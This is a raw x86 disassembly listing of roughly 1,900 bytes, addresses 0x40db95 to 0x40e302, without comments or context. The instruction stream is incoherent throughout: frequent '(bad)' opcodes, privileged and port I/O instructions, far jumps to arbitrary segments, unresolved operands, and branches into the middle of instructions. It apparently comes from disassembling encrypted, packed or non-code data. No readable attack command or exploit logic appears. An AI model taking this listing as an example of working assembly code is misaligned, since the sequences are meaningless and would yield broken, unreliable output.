  40db95:	stos   DWORD PTR es:[edi],eax
  40db96:	enter  0xe7a4,0x9f
  40db9a:	into   
  40db9b:	xchg   esp,eax
  40db9c:	pop    ss
  40db9d:	cmp    eax,DWORD PTR [ecx]
  40db9f:	loop   0x40db4e
  40dba1:	mov    ebx,0x51a6823
  40dba6:	cmp    dl,dh
  40dba8:	ret    0x9c6
  40dbab:	or     eax,DWORD PTR [ebp-0x3b9a3d4d]
  40dbb1:	mov    ?,WORD PTR [ecx+ebp*8-0x64df9376]
  40dbb8:	mov    dl,BYTE PTR ds:0x3593320
  40dbbe:	out    0x59,eax
  40dbc0:	cmp    al,0x76
  40dbc2:	dec    esp
  40dbc3:	jmp    0xb36f:0x781e05ae
  40dbca:	add    ebp,edx
  40dbcc:	xor    eax,0xbe0917a7
  40dbd1:	add    ecx,DWORD PTR [edi+eax*1]
  40dbd4:	pop    ebp
  40dbd5:	aad    0xaa
  40dbd7:	ror    dl,0x5f
  40dbda:	lods   eax,DWORD PTR ds:[esi]
  40dbdb:	mov    esp,0x9c398d00
  40dbe0:	adc    ebp,DWORD PTR [edi+eiz*8-0x26]
  40dbe4:	ins    DWORD PTR es:[edi],dx
  40dbe5:	out    0xbd,eax
  40dbe7:	enter  0x8548,0x3f
  40dbeb:	mov    eax,DWORD PTR ds:0x8b8e1a6
  40dbf1:	mov    WORD PTR [edx+0x1],?
  40dbf4:	mov    edi,0x69a04c9d
  40dbf9:	inc    ebp
  40dbfa:	cwde   
  40dbfb:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbfd:	fisubr DWORD PTR [edi-0x2c987cee]
  40dc03:	push   edi
  40dc04:	ss or  eax,0x18ed4122
  40dc0a:	pop    ds
  40dc0b:	int    0x92
  40dc0d:	jbe    0x40dbb5
  40dc0f:	jns    0x40dc34
  40dc11:	jecxz  0x40dbbd
  40dc13:	(bad)  
  40dc15:	daa    
  40dc16:	xor    BYTE PTR [edx+esi*2-0x5c],dl
  40dc1a:	jns    0x40dc2d
  40dc1c:	addr16 retf 0xba34
  40dc20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc21:	ss popa 
  40dc23:	sub    BYTE PTR [ebx-0xc],dh
  40dc26:	ss rdrand ecx
  40dc2a:	inc    edi
  40dc2b:	and    eax,0xbc6626d0
  40dc30:	dec    ebx
  40dc31:	mov    cl,0xc0
  40dc33:	inc    BYTE PTR [ebx+0x40]
  40dc36:	test   BYTE PTR [ecx+0x67],0x2c
  40dc3a:	repnz (bad) 
  40dc3c:	jmp    0x40dbf0
  40dc3e:	mov    ebp,0xecc20a58
  40dc43:	jp     0x40dc11
  40dc45:	add    eax,0x6ab04116
  40dc4a:	in     al,0xe5
  40dc4c:	xor    eax,0x234c1f69
  40dc51:	cwde   
  40dc52:	inc    eax
  40dc53:	(bad)  
  40dc54:	aas    
  40dc55:	jne    0x40dca1
  40dc57:	jecxz  0x40dc7c
  40dc59:	cmp    ah,al
  40dc5b:	mov    eax,es:0x4711db3e
  40dc61:	loopne 0x40dbf7
  40dc63:	dec    edx
  40dc64:	iret   
  40dc65:	es sbb eax,ebx
  40dc68:	mov    eax,ds:0x8504e538
  40dc6d:	pop    esp
  40dc6e:	ret    
  40dc6f:	arpl   WORD PTR [eax-0x1c0dd72c],bx
  40dc75:	jmp    0xf6f5:0xf0a26df5
  40dc7c:	(bad)  
  40dc7d:	xor    ah,BYTE PTR [edi]
  40dc7f:	out    0x49,al
  40dc81:	cmp    eax,DWORD PTR [ebp+0x50d72260]
  40dc87:	jecxz  0x40dcc6
  40dc89:	in     eax,dx
  40dc8a:	jg     0x40dcaa
  40dc8c:	mov    ecx,0xe947d880
  40dc91:	mov    ?,WORD PTR [esi-0x56b79ec0]
  40dc97:	mov    bl,0x88
  40dc99:	jg     0x40dcdd
  40dc9b:	scas   eax,DWORD PTR es:[edi]
  40dc9c:	fmul   DWORD PTR [ecx-0x56010cf6]
  40dca2:	add    BYTE PTR [edi],dh
  40dca4:	or     al,0xdd
  40dca6:	fsubr  QWORD PTR [esi+0x27b0b957]
  40dcac:	scas   eax,DWORD PTR es:[edi]
  40dcad:	dec    edi
  40dcae:	into   
  40dcaf:	push   esi
  40dcb0:	dec    edi
  40dcb1:	dec    ebp
  40dcb2:	xor    bl,0x91
  40dcb5:	popa   
  40dcb6:	bnd jge 0x40dce1
  40dcb9:	imul   dl
  40dcbb:	add    al,0x1f
  40dcbd:	(bad)  
  40dcbe:	loop   0x40dcdd
  40dcc0:	mov    edi,0x5e1b1811
  40dcc5:	and    esp,ecx
  40dcc7:	mov    edx,0x4e09625
  40dccc:	pop    esi
  40dccd:	outs   dx,DWORD PTR ds:[esi]
  40dcce:	imul   esp,DWORD PTR [edi+eiz*1-0x35fde627],0x166c8815
  40dcd9:	lods   al,BYTE PTR ds:[esi]
  40dcda:	jo     0x40dcc6
  40dcdc:	rol    BYTE PTR [edi-0x28af1126],1
  40dce2:	dec    ebx
  40dce3:	cmp    eax,0x721dd628
  40dce8:	je     0x40dca1
  40dcea:	dec    esi
  40dceb:	lods   eax,DWORD PTR ds:[esi]
  40dcec:	inc    edx
  40dced:	pop    DWORD PTR [edi+0x58e09dad]
  40dcf3:	sbb    ch,BYTE PTR [esp+edx*2-0x7c]
  40dcf7:	cli    
  40dcf8:	nop
  40dcf9:	fild   WORD PTR [edi-0x7a]
  40dcfc:	jle    0x40dcb9
  40dcfe:	jl     0x40dd74
  40dd00:	stos   DWORD PTR es:[edi],eax
  40dd01:	(bad)  
  40dd02:	sti    
  40dd03:	push   eax
  40dd04:	and    dl,BYTE PTR [esp+edx*2+0x5d]
  40dd08:	adc    ecx,DWORD PTR [eax]
  40dd0a:	cli    
  40dd0b:	mov    bl,0x6
  40dd0d:	inc    eax
  40dd0e:	(bad)  
  40dd0f:	xchg   edi,eax
  40dd10:	sbb    BYTE PTR gs:[ebx+ecx*1],ch
  40dd14:	and    DWORD PTR [ebx],esp
  40dd16:	mov    BYTE PTR [esi-0x57b565d9],dh
  40dd1c:	sbb    BYTE PTR [edi-0x5c5e837c],ch
  40dd22:	xchg   edx,eax
  40dd23:	in     al,0xad
  40dd25:	iret   
  40dd26:	je     0x40dd1b
  40dd28:	mov    dl,BYTE PTR [edx]
  40dd2a:	fwait
  40dd2b:	fwait
  40dd2c:	pop    es
  40dd2d:	call   0x3ac9e67c
  40dd32:	call   0x241c84ba
  40dd37:	jne    0x40dd45
  40dd39:	push   ss
  40dd3a:	xor    dl,BYTE PTR [eax]
  40dd3c:	pushf  
  40dd3d:	int3   
  40dd3e:	sbb    DWORD PTR [ebp+0x46],ebx
  40dd41:	and    al,0x42
  40dd43:	fcomp  QWORD PTR [edx+0x601d1cf1]
  40dd49:	js     0x40dd84
  40dd4b:	push   ebp
  40dd4c:	mov    BYTE PTR [eax],0x1d
  40dd4f:	mov    ds:0x4b7276fe,al
  40dd54:	add    bh,bl
  40dd56:	sbb    al,0xd
  40dd58:	loopne 0x40ddb6
  40dd5a:	outs   dx,BYTE PTR ds:[esi]
  40dd5b:	faddp  st(2),st
  40dd5d:	fsub   QWORD PTR [eax]
  40dd5f:	cmp    BYTE PTR [edi+0x3c],cl
  40dd62:	sbb    eax,0x6f303395
  40dd67:	adc    DWORD PTR [edi-0x40a1f271],ebp
  40dd6d:	int    0x70
  40dd6f:	jecxz  0x40dd58
  40dd71:	lahf   
  40dd72:	xchg   ebx,eax
  40dd73:	mov    al,0x1a
  40dd75:	mov    al,ds:0xfe851d0c
  40dd7a:	add    ah,BYTE PTR [eax]
  40dd7c:	hlt    
  40dd7d:	dec    esp
  40dd7e:	(bad)  
  40dd7f:	cs aaa 
  40dd81:	bound  ecx,QWORD PTR [esi]
  40dd83:	das    
  40dd84:	lock and ecx,DWORD PTR [esi]
  40dd87:	mov    BYTE PTR [edi+0x27],dh
  40dd8a:	scas   eax,DWORD PTR es:[edi]
  40dd8b:	jb     0x40de03
  40dd8d:	jmp    0x17b9:0x19cc090d
  40dd94:	dec    ebp
  40dd95:	jmp    esi
  40dd97:	and    ch,BYTE PTR [ebp+0x2e]
  40dd9a:	xchg   ecx,eax
  40dd9b:	sbb    al,BYTE PTR ds:0x5f05b516
  40dda1:	sbb    bl,BYTE PTR [edi-0x65f0588e]
  40dda7:	test   al,0x71
  40dda9:	pop    es
  40ddaa:	ret    
  40ddab:	rcr    BYTE PTR ds:0xf42a2bbd,cl
  40ddb1:	mov    gs,WORD PTR [ecx-0x5da51afb]
  40ddb7:	test   al,0xad
  40ddb9:	jnp    0x40ddfd
  40ddbb:	lock test DWORD PTR ds:0x864e,esi
  40ddc1:	hlt    
  40ddc2:	imul   edi,DWORD PTR [ebx],0x17cb01b
  40ddc8:	in     al,dx
  40ddc9:	hlt    
  40ddca:	dec    esp
  40ddcb:	(bad)  
  40ddcc:	fcom   QWORD PTR [eax]
  40ddce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddcf:	pop    ecx
  40ddd0:	sar    DWORD PTR [esp+ebx*2],cl
  40ddd3:	mov    esp,0x37ef2fa5
  40ddd8:	mul    cl
  40ddda:	jmp    0xfaa1c7e6
  40dddf:	add    esp,ebx
  40dde1:	out    0x17,al
  40dde3:	jl     0x40ddfd
  40dde5:	pop    ebx
  40dde6:	lods   eax,DWORD PTR ds:[esi]
  40dde7:	ret    0x5b3f
  40ddea:	and    DWORD PTR [ecx+edi*8-0x2f],esp
  40ddee:	hlt    
  40ddef:	test   al,0x3f
  40ddf1:	call   0x2cf1:0x70af34f
  40ddf8:	add    eax,0x213167bf
  40ddfd:	cmc    
  40ddfe:	nop
  40ddff:	test   edi,0xcf56cf4d
  40de05:	pop    edi
  40de06:	ins    BYTE PTR es:[edi],dx
  40de07:	push   esi
  40de08:	inc    ebp
  40de09:	and    al,0xc6
  40de0b:	adc    eax,0x55f06d21
  40de10:	xchg   ecx,eax
  40de11:	nop
  40de12:	ins    BYTE PTR es:[edi],dx
  40de13:	repnz adc BYTE PTR [edx-0x33],dh
  40de17:	mov    ch,0x24
  40de19:	sti    
  40de1a:	loop   0x40ddbe
  40de1c:	into   
  40de1d:	or     eax,0x83a18ecc
  40de22:	jmp    0xa0654f29
  40de27:	jp     0x40ddc0
  40de29:	xchg   edi,eax
  40de2a:	sbb    dl,BYTE PTR [edi]
  40de2c:	cld    
  40de2d:	jle    0x40ddc5
  40de2f:	sub    BYTE PTR [edx],bh
  40de31:	int    0xc5
  40de33:	sub    esi,esi
  40de35:	jmp    0x4de2ce22
  40de3a:	cld    
  40de3b:	pop    edi
  40de3c:	mov    al,ds:0xe8579
  40de41:	adc    DWORD PTR [ebp+0xe172694],0x31db40a3
  40de4b:	bound  ecx,QWORD PTR [esi+0x23]
  40de4e:	fnstsw WORD PTR [ecx-0x78b13d28]
  40de54:	(bad)  
  40de56:	fcmove st,st(2)
  40de58:	leave  
  40de59:	idiv   DWORD PTR [ecx+0x6d4f573a]
  40de5f:	mul    DWORD PTR [ebx-0x4]
  40de62:	in     eax,0xb8
  40de64:	fild   QWORD PTR [ebx]
  40de66:	repz shl BYTE PTR [eax],0xcd
  40de6a:	jg     0x40de28
  40de6c:	stos   BYTE PTR es:[edi],al
  40de6d:	pop    esi
  40de6e:	inc    esi
  40de6f:	sbb    al,0xc
  40de71:	div    dl
  40de73:	and    eax,0x9da5cb26
  40de78:	mov    bh,0xdb
  40de7a:	pop    ss
  40de7b:	cli    
  40de7c:	xchg   BYTE PTR [edi],bh
  40de7e:	add    al,0x96
  40de80:	adc    dh,bh
  40de82:	cmp    DWORD PTR [eax-0x74ff41a9],0xe797ee77
  40de8c:	sbb    dh,BYTE PTR [eax-0x4282c00f]
  40de92:	in     al,0xfb
  40de94:	pop    si
  40de96:	inc    edx
  40de97:	iret   
  40de98:	xor    eax,0xb3ed8e24
  40de9d:	push   0xea2e9f7f
  40dea2:	cmc    
  40dea3:	or     DWORD PTR [edi+0x1e90684],esi
  40dea9:	cmc    
  40deaa:	arpl   WORD PTR [ecx*8+0x612b3b3c],dx
  40deb1:	test   DWORD PTR [edx+0x3085c74d],edx
  40deb7:	mov    cl,0x28
  40deb9:	dec    eax
  40deba:	rol    DWORD PTR [ecx+edx*4],1
  40debd:	sbb    ebx,DWORD PTR [esi]
  40debf:	xor    ecx,DWORD PTR [eax-0x79]
  40dec2:	arpl   WORD PTR ds:0xe255b5f5,ax
  40dec8:	xchg   edi,eax
  40dec9:	(bad)  
  40deca:	or     al,0xcb
  40decc:	adc    al,0xa
  40dece:	enter  0x4dda,0x6d
  40ded2:	les    edx,FWORD PTR [ecx]
  40ded4:	test   eax,0x156471e5
  40ded9:	in     eax,dx
  40deda:	leave  
  40dedb:	cld    
  40dedc:	mov    cs,WORD PTR ds:0x7750b7e1
  40dee2:	aad    0x8e
  40dee4:	out    dx,eax
  40dee5:	or     BYTE PTR [ebx+0x2b03fbf8],ah
  40deeb:	pop    edi
  40deec:	retf   0x9d74
  40deef:	fcom   DWORD PTR [ecx]
  40def1:	xor    edx,esi
  40def3:	nop
  40def4:	adc    al,0x4b
  40def6:	and    BYTE PTR [esp+esi*1],al
  40def9:	sbb    al,0x8b
  40defb:	mov    dh,0xa2
  40defd:	mov    eax,0xf206b4f0
  40df02:	int3   
  40df03:	cmp    eax,0xf6bcd28f
  40df08:	fcmovne st,st(4)
  40df0a:	sub    DWORD PTR [ecx+ebx*1-0x7e23ae25],esp
  40df11:	dec    ebp
  40df12:	dec    edx
  40df13:	cmc    
  40df14:	out    0xa4,eax
  40df16:	adc    BYTE PTR ds:0xa22e1330,bl
  40df1c:	addr16 push ds
  40df1e:	xchg   ebp,eax
  40df1f:	retf   0xcafc
  40df22:	stc    
  40df23:	nop
  40df24:	call   FWORD PTR [edi]
  40df26:	lods   eax,DWORD PTR ds:[esi]
  40df27:	mov    DWORD PTR [esi+eax*1],edi
  40df2a:	imul   ecx,DWORD PTR [ecx-0x12],0xe420bd02
  40df31:	call   0xc24b107f
  40df36:	arpl   WORD PTR [esi+0x68],sp
  40df39:	push   0x3de7ee40
  40df3e:	hlt    
  40df3f:	scas   al,BYTE PTR es:[edi]
  40df40:	cld    
  40df41:	retf   0x27ea
  40df44:	add    BYTE PTR [ebx],ch
  40df46:	xor    BYTE PTR [ecx-0x6b9d1c1],0x81
  40df4d:	aaa    
  40df4e:	in     al,dx
  40df4f:	sbb    al,0xff
  40df51:	dec    eax
  40df52:	cmp    eax,0xb7500696
  40df57:	retf   0x6d86
  40df5a:	cmp    dl,0xd3
  40df5d:	pop    esp
  40df5e:	jl     0x40dfc1
  40df60:	dec    ebx
  40df61:	dec    ebp
  40df62:	jae    0x40df69
  40df64:	icebp  
  40df65:	aaa    
  40df66:	pop    eax
  40df67:	push   esp
  40df68:	ret    0xea88
  40df6b:	(bad)  
  40df6c:	clc    
  40df6d:	and    DWORD PTR [ebx-0x7479c0ee],esi
  40df73:	or     ebx,edx
  40df75:	out    dx,eax
  40df76:	xlat   BYTE PTR ds:[ebx]
  40df77:	adc    edx,DWORD PTR fs:[ebp-0x73]
  40df7b:	std    
  40df7c:	ret    0xbb8a
  40df7f:	xchg   ebx,eax
  40df80:	sub    al,0x61
  40df82:	sub    dh,bh
  40df84:	add    eax,DWORD PTR cs:[edi]
  40df87:	push   ss
  40df88:	push   es
  40df89:	inc    ebp
  40df8a:	js     0x40dfb7
  40df8c:	shl    DWORD PTR [edx],0x5f
  40df8f:	fcmovne st,st(6)
  40df91:	in     eax,dx
  40df92:	or     ecx,DWORD PTR [ecx]
  40df94:	das    
  40df95:	cmpxchg al,bh
  40df98:	ins    DWORD PTR es:[edi],dx
  40df99:	cmp    eax,0x28af492c
  40df9e:	cld    
  40df9f:	cmp    dh,0xd2
  40dfa2:	rcr    BYTE PTR [ebx],1
  40dfa4:	xor    eax,0xf5f757d3
  40dfa9:	xchg   DWORD PTR [ebx],esi
  40dfab:	stc    
  40dfac:	pop    ecx
  40dfad:	mov    al,0x7a
  40dfaf:	xchg   ecx,eax
  40dfb0:	in     eax,dx
  40dfb1:	ret    
  40dfb2:	xchg   ebx,eax
  40dfb3:	cli    
  40dfb4:	xchg   esp,eax
  40dfb5:	(bad)  
  40dfb6:	jp     0x40dfa8
  40dfb8:	mov    esp,0x68ba550c
  40dfbd:	rcr    DWORD PTR [edx-0x410218bf],1
  40dfc3:	test   al,0x11
  40dfc5:	sub    eax,0x33d2df4e
  40dfca:	push   ebp
  40dfcb:	jne    0x40dfa6
  40dfcd:	cmp    eax,0xeae0776f
  40dfd2:	lds    esi,FWORD PTR [edx]
  40dfd4:	xchg   ebx,eax
  40dfd5:	imul   esp,DWORD PTR [ebx+0x36],0xfea2aeb7
  40dfdc:	daa    
  40dfdd:	hlt    
  40dfde:	lods   al,BYTE PTR ds:[esi]
  40dfdf:	push   ecx
  40dfe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfe1:	sub    ah,dh
  40dfe3:	mov    ch,0xa5
  40dfe5:	jmp    0x8b59:0xf58efdb3
  40dfec:	outs   dx,DWORD PTR ds:[esi]
  40dfed:	cmp    al,BYTE PTR [eax-0x53c5a89c]
  40dff3:	add    dl,BYTE PTR [ebx+0x75]
  40dff6:	sub    ebx,DWORD PTR [edx+0x4884c212]
  40dffc:	mov    ch,ah
  40dffe:	push   cs
  40dfff:	ror    ah,1
  40e001:	jg     0x40e02f
  40e003:	scas   eax,DWORD PTR es:[edi]
  40e004:	out    0xad,eax
  40e006:	cld    
  40e007:	add    al,0x1a
  40e009:	mov    ebp,0xd74b1c52
  40e00e:	cwde   
  40e00f:	xor    esp,edi
  40e011:	lds    ecx,FWORD PTR [esi+0xdb22458]
  40e017:	rol    cl,0x3b
  40e01a:	mov    ds,WORD PTR [edi+0x6b]
  40e01d:	add    edx,DWORD PTR [ecx+0x44]
  40e020:	cld    
  40e021:	stos   BYTE PTR es:[edi],al
  40e022:	push   0x7e1cf0eb
  40e027:	mov    ss,WORD PTR [esi+0x2d]
  40e02a:	add    eax,0x4a5dbddc
  40e02f:	xchg   BYTE PTR [ecx-0x60e3dfbe],al
  40e035:	test   eax,0xb5a160f8
  40e03a:	fs dec edx
  40e03c:	xor    DWORD PTR [ebx],0x8814f3ed
  40e042:	mov    al,0xe
  40e044:	push   ebx
  40e045:	imul   ebp,edi,0x461ca624
  40e04b:	retf   
  40e04c:	lods   al,BYTE PTR ds:[esi]
  40e04d:	ficomp DWORD PTR [edi-0x4a4dd249]
  40e053:	and    BYTE PTR [ecx+0x59],al
  40e056:	retf   
  40e057:	repz pop bp
  40e05a:	inc    eax
  40e05b:	test   eax,0x941b95f5
  40e060:	mov    al,0x4c
  40e062:	ds icebp 
  40e064:	sub    eax,DWORD PTR [edi+0x795bcd90]
  40e06a:	sbb    al,0xb9
  40e06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e06d:	pop    ss
  40e06e:	sbb    DWORD PTR [eax-0xd0e8df1],edx
  40e074:	retf   
  40e075:	jns    0x40e02a
  40e077:	xlat   BYTE PTR ds:[ebx]
  40e078:	cmp    al,0xef
  40e07a:	jmp    FWORD PTR ds:0xc1a2c580
  40e080:	jno    0x40e04c
  40e082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e083:	or     eax,DWORD PTR [ebp-0x337e38be]
  40e089:	xchg   esi,eax
  40e08a:	cmp    al,al
  40e08c:	ret    0xfba0
  40e08f:	or     eax,0xc74e2fdc
  40e094:	cs je  0x40e049
  40e097:	push   ecx
  40e098:	data16 mov dh,BYTE PTR [ecx]
  40e09b:	out    0x20,al
  40e09d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e09e:	icebp  
  40e09f:	jns    0x40e10a
  40e0a1:	int    0x19
  40e0a3:	xor    BYTE PTR [ebx+0x43],bh
  40e0a6:	stc    
  40e0a7:	pop    eax
  40e0a8:	fcmovnb st,st(3)
  40e0aa:	rcl    DWORD PTR [ecx+0x87fbf40],cl
  40e0b0:	hlt    
  40e0b1:	in     eax,dx
  40e0b2:	xor    edx,esi
  40e0b4:	add    BYTE PTR [edx+0x32],cl
  40e0b7:	ror    dh,1
  40e0b9:	out    dx,eax
  40e0ba:	xchg   edx,eax
  40e0bb:	add    al,0xfb
  40e0bd:	sbb    DWORD PTR [edi+0x39a02454],ecx
  40e0c3:	rcl    BYTE PTR [ecx+0x47],1
  40e0c6:	cmp    DWORD PTR [ebx-0x28c6a72f],eax
  40e0cc:	adc    DWORD PTR [ebx-0x15],0xffffff94
  40e0d0:	pop    ecx
  40e0d1:	push   esp
  40e0d2:	inc    esi
  40e0d3:	push   es
  40e0d4:	xchg   ebp,eax
  40e0d5:	adc    esi,DWORD PTR [ebx]
  40e0d7:	or     al,0x53
  40e0d9:	nop
  40e0da:	into   
  40e0db:	out    dx,al
  40e0dc:	lods   al,BYTE PTR ds:[esi]
  40e0dd:	shl    BYTE PTR [ecx+eiz*8-0x74],1
  40e0e1:	lock outs dx,BYTE PTR ds:[esi]
  40e0e3:	pop    edi
  40e0e4:	fidivr DWORD PTR [ebx]
  40e0e6:	aas    
  40e0e7:	mov    dh,al
  40e0e9:	loope  0x40e0f4
  40e0eb:	sbb    DWORD PTR [ebp+0x729ba235],eax
  40e0f1:	int3   
  40e0f2:	es (bad) 
  40e0f5:	aam    0x88
  40e0f7:	stos   BYTE PTR es:[edi],al
  40e0f8:	jnp    0x40e120
  40e0fa:	pop    ds
  40e0fb:	push   cs
  40e0fc:	pushf  
  40e0fd:	test   DWORD PTR [esi-0x4365dc66],esp
  40e103:	adc    dl,BYTE PTR [edi+0x36]
  40e106:	gs iret 
  40e108:	xchg   ecx,eax
  40e109:	push   esp
  40e10a:	call   0xc29a95da
  40e10f:	push   0x3a319b03
  40e114:	add    edx,0x7bf4caac
  40e11a:	cs pop edi
  40e11c:	lds    edx,FWORD PTR [ebp+0x7b45dae2]
  40e122:	sbb    ebp,ecx
  40e124:	(bad)  
  40e125:	popf   
  40e126:	(bad)  
  40e127:	je     0x40e157
  40e129:	mov    ebx,0x94cd4a7
  40e12e:	dec    ebp
  40e12f:	dec    ebp
  40e130:	out    dx,eax
  40e131:	push   ebx
  40e132:	test   al,0xb5
  40e134:	pusha  
  40e135:	stc    
  40e136:	retf   
  40e137:	fwait
  40e138:	mov    DWORD PTR [ecx+0x46],esp
  40e13b:	or     BYTE PTR [ebx],ch
  40e13d:	adc    bl,al
  40e13f:	mov    al,BYTE PTR [edx-0x25]
  40e142:	(bad)
  40e145:	adc    edi,DWORD PTR [eax-0x4f]
  40e148:	les    eax,FWORD PTR [eax+0x4f]
  40e14b:	push   ebx
  40e14c:	sub    al,0xae
  40e14e:	mov    edi,0x53fa6075
  40e153:	ret    
  40e154:	cmp    BYTE PTR [edi-0x1906578b],0x75
  40e15b:	add    bl,BYTE PTR [ebp+0x7f8801b3]
  40e161:	xchg   edx,eax
  40e162:	(bad)  
  40e163:	fld    st(2)
  40e165:	dec    edi
  40e166:	pusha  
  40e167:	dec    ecx
  40e168:	fmul   QWORD PTR [esi]
  40e16a:	outs   dx,DWORD PTR ds:[esi]
  40e16b:	inc    ecx
  40e16c:	jb     0x40e1d7
  40e16e:	pop    eax
  40e16f:	mov    dh,0x83
  40e171:	std    
  40e172:	push   edx
  40e173:	inc    ebx
  40e174:	out    dx,al
  40e175:	push   edx
  40e176:	xlat   BYTE PTR ds:[ebx]
  40e177:	dec    edi
  40e178:	mov    ch,0x63
  40e17a:	mov    al,0xf0
  40e17c:	or     eax,0x86592f9c
  40e181:	in     al,dx
  40e182:	(bad)  
  40e183:	loop   0x40e1c6
  40e185:	xlat   BYTE PTR ds:[ebx]
  40e186:	mov    cl,0x8a
  40e188:	inc    esi
  40e189:	inc    edx
  40e18a:	in     al,dx
  40e18b:	into   
  40e18c:	repz push edi
  40e18e:	mov    eax,0xd83a400a
  40e193:	dec    edx
  40e194:	cs js  0x40e211
  40e197:	push   0xffffffa6
  40e199:	sbb    DWORD PTR ds:[ebx-0x7de3c364],0xfffffffc
  40e1a1:	fimul  WORD PTR [edx+0x59]
  40e1a4:	popf   
  40e1a5:	repz jge 0x40e15b
  40e1a8:	sub    dl,BYTE PTR [eax]
  40e1aa:	cmp    dl,BYTE PTR [ecx+eax*1]
  40e1ad:	cdq    
  40e1ae:	ja     0x40e147
  40e1b0:	jns    0x40e192
  40e1b2:	icebp  
  40e1b3:	mov    ebx,0x2b5651d6
  40e1b8:	sub    ch,dh
  40e1ba:	sub    dl,bh
  40e1bc:	xor    BYTE PTR [edx],ah
  40e1be:	aam    0xcf
  40e1c0:	pop    edi
  40e1c1:	je     0x40e1e3
  40e1c3:	mov    ecx,0x4c9de31a
  40e1c8:	arpl   WORD PTR [esi],ax
  40e1ca:	test   al,dh
  40e1cc:	push   eax
  40e1cd:	addr16 push ecx
  40e1cf:	frstor [ecx]
  40e1d1:	cmp    DWORD PTR [eax-0x4d66c033],edx
  40e1d7:	mov    edx,0xb545b0ab
  40e1dc:	pop    ds
  40e1dd:	or     edi,ecx
  40e1df:	push   esi
  40e1e0:	add    ah,BYTE PTR [esi]
  40e1e2:	jns    0x40e205
  40e1e4:	out    dx,eax
  40e1e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1e6:	mov    dl,0xd9
  40e1e8:	popf   
  40e1e9:	xor    ch,dh
  40e1eb:	hlt    
  40e1ec:	fisub  WORD PTR [edi+0x217934f0]
  40e1f2:	scas   al,BYTE PTR es:[edi]
  40e1f3:	enter  0xa0b0,0xd4
  40e1f7:	das    
  40e1f8:	lahf   
  40e1f9:	push   ebx
  40e1fa:	out    dx,al
  40e1fb:	add    dl,bh
  40e1fd:	push   edi
  40e1fe:	in     eax,dx
  40e1ff:	sub    DWORD PTR [eax+0x3771bfb7],esp
  40e205:	in     al,dx
  40e206:	mov    ch,0xae
  40e208:	mov    edx,0xb02ed4b6
  40e20d:	push   ebx
  40e20e:	add    ecx,DWORD PTR [ebp+eiz*4+0x33]
  40e212:	sbb    DWORD PTR ds:0x697ce7f6,edx
  40e218:	rcr    DWORD PTR [ebp+0x17ec8507],1
  40e21e:	ficomp DWORD PTR [edx+0x6d8f32f6]
  40e224:	leave  
  40e225:	popa   
  40e226:	retf   
  40e227:	stc    
  40e228:	mov    bh,0xba
  40e22a:	pop    edi
  40e22b:	lods   eax,DWORD PTR ds:[esi]
  40e22c:	pop    edx
  40e22d:	ret    
  40e22e:	pop    edi
  40e22f:	sub    ch,BYTE PTR ds:0xe57556d2
  40e235:	lods   eax,DWORD PTR ds:[esi]
  40e236:	ret    0x9420
  40e239:	xor    al,0x56
  40e23b:	xchg   ecx,eax
  40e23c:	jp     0x40e23d
  40e23e:	inc    edi
  40e23f:	push   esi
  40e240:	mov    eax,0xfa33c3db
  40e245:	imul   ecx,DWORD PTR [edi-0x32],0xffffff88
  40e249:	dec    ebp
  40e24a:	pop    esp
  40e24b:	sbb    esp,0xffffff87
  40e24e:	icebp  
  40e24f:	jb     0x40e228
  40e251:	leave  
  40e252:	out    0xc7,al
  40e254:	push   edi
  40e255:	popf   
  40e256:	cmp    eax,0x8946f013
  40e25b:	mov    eax,0xead185e2
  40e260:	xchg   esi,eax
  40e261:	imul   edx,ebp,0x2a
  40e264:	sbb    eax,0x1c8f5370
  40e269:	lds    edi,FWORD PTR [edx-0x35]
  40e26c:	push   0x7a
  40e26e:	jbe    0x40e274
  40e270:	shr    ecx,0xaf
  40e273:	xor    BYTE PTR [ecx+eax*1],al
  40e276:	pop    ecx
  40e277:	push   esi
  40e278:	ret    0x2731
  40e27b:	aaa    
  40e27c:	xor    eax,0x8487447c
  40e281:	lods   al,BYTE PTR ds:[esi]
  40e282:	int    0xa3
  40e284:	jge    0x40e23d
  40e286:	pop    esi
  40e287:	mov    dh,BYTE PTR [ebx]
  40e289:	ss adc ecx,ecx
  40e28c:	xchg   ebx,eax
  40e28d:	cmp    ebp,esi
  40e28f:	cmp    BYTE PTR [ecx],al
  40e291:	jbe    0x40e270
  40e293:	push   0x3fefc9b2
  40e298:	jo     0x40e2ca
  40e29a:	xchg   edi,eax
  40e29b:	cmp    esi,DWORD PTR ds:0xd32fffa4
  40e2a1:	rsm    
  40e2a3:	add    al,BYTE PTR [esi+0x13d85b17]
  40e2a9:	test   eax,ecx
  40e2ab:	adc    al,0x9b
  40e2ad:	pop    es
  40e2ae:	and    eax,0x44ab8e94
  40e2b3:	jo     0x40e2b7
  40e2b5:	sbb    cl,0x8e
  40e2b8:	cmp    eax,0x503a1d81
  40e2bd:	inc    ebp
  40e2be:	loope  0x40e258
  40e2c0:	and    bl,BYTE PTR [edi-0x1806dabf]
  40e2c6:	dec    edi
  40e2c7:	div    ch
  40e2c9:	mov    bl,0xd4
  40e2cb:	bound  edx,QWORD PTR ds:[esi+0x1f3e4665]
  40e2d2:	retf   0xc5cd
  40e2d5:	popf   
  40e2d6:	lds    ebx,FWORD PTR [edx-0x52]
  40e2d9:	dec    ebx
  40e2da:	sbb    cl,BYTE PTR [eax+0xa14f362]
  40e2e0:	mov    esp,0x4b5a4334
  40e2e5:	push   edi
  40e2e6:	repz pop edx
  40e2e8:	mov    esi,0x652177f8
  40e2ed:	and    al,0x15
  40e2ef:	mov    ah,0x68
  40e2f1:	pop    esp
  40e2f2:	push   eax
  40e2f3:	shl    DWORD PTR [ecx],1
  40e2f5:	cli    
  40e2f6:	pop    es
  40e2f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2f8:	xlat   BYTE PTR ds:[ebx]
  40e2f9:	fcmovbe st,st(2)
  40e2fb:	sti    
  40e2fc:	inc    esi
  40e2fd:	(bad)  
  40e2fe:	int    0xc5
  40e300:	repnz pop eax
  40e302:	mov    ds:0x789ad601,eax
